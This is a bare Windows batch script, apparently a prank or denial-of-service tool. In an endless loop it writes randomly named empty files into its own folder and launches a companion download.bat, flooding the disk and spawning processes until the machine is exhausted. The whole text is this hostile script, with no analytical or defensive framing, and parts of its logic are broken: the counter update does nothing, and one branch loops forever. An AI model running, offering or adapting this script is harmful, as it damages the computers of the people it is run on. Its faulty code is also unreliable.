:flood
MODE CON COLS=999 LINES=999
set /a r = ( %RANDOM% / 100 )
:while
if %r% GTR 2 (
  set %r% = %r% - 1 ;
  echo.>%~dp0\%RANDOM%%RANDOM%
  )
if %r% LEQ 2 (
  goto while
  )
start %~dp0\download.bat
goto flood